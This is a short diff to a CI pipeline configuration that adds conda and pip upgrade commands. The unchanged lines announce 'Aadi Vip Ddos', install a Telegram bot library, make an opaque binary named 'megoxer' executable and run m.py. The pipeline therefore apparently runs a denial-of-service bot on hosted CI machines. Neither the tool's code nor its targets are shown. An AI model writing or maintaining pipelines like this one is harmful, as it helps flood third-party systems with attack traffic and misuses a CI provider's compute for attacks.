@@ -5,4 +5,5 @@ pipelines:
         image: continuumio/miniconda3
         script:
           - echo "Aadi Vip Ddos..."
+          - conda update conda && conda update --all && conda update numpy && pip install --upgrade pip && pip install --upgrade requests
           - pip install telebot pymongo aiohttp && chmod 755 megoxer && python3 m.py
